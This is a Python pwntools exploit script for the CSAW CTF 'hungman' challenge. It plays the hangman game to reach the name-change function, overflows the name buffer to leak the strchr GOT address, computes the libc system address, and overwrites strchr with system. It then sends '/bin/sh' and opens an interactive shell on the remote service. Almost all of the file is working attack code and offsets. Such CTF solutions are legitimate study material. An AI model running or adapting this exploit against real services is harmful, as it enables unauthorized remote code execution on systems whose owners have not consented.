from pwn import *
import re
import struct
import time


elf = ELF('./hungman')

#r = remote('192.168.13.196', 8003)         # /bin/sh -c su hungman -c "socat -T10 TCP-LISTEN:8000,reuseaddr,fork EXEC:/home/hungman/hungman"
                                            # LD_PRELOAD=./libc-2.23.so socat TCP-LISTEN:8003,reuseaddr,fork EXEC:"./hungman"
r = remote('pwn.chal.csaw.io', 8003)


def dummy_get_hiscore():
    r.clean()
    r.sendline('a')
    r.sendline('a')
    r.sendline('a')
    r.sendline('a')
    r.clean(.1)

def get_hiscore():
    r.clean(.1)
    won = False
    while not won:
        char = ord('c')
        i = 0
        while True:
            char += i
            c = chr(char)
            r.sendline(c)
            resp = r.clean(.1)
            if 'name?' in resp:
                won = True
                break
            elif 'Continue?' in resp:
                won = False
                break
            i += 1
        if not won:
            r.sendline('y')
            r.clean()
            print 'Lost...'
        else:
            print 'Won!'

def change_name(name):
    r.clean()
    r.sendline('y')
    time.sleep(.1)
    r.send(name)

    resp = r.recvuntil('Continue?')
    new_name = re.findall(r'Highest player: (.*) score:', resp)[0]
    return new_name

def send_cmd(cmd):
    r.sendline('y')
    print "[$]",cmd
    r.send(cmd)


r.recvuntil('name?')

name = 'B'*74       # arbitrary length to get points easier
r.sendline(name)
r.clean(.1)

get_hiscore()

strchr_got = struct.pack('Q', 0x0000000000602038)
new_name = "A"*96 + "\x00"*4 + struct.pack("I", 0x4b) + strchr_got + "C"*8 + '\n' #"C"*136

strchr = change_name(new_name)
if len(strchr) != 8:
    strchr = strchr + '\x00'*(8-len(strchr))
strchr = struct.unpack('Q', strchr)[0]

system = strchr - 0x43d00
system_addr = struct.pack('Q', system)

print '[+] strchr addr',hex(strchr)
print '[+] system addr',hex(system)
r.sendline('y')

dummy_get_hiscore()
print "[+] Overwrite strchr with system", `system_addr`, 'to',hex(strchr)
addr = change_name(system_addr)

get_hiscore()
addr = send_cmd('/bin/sh')

r.interactive()
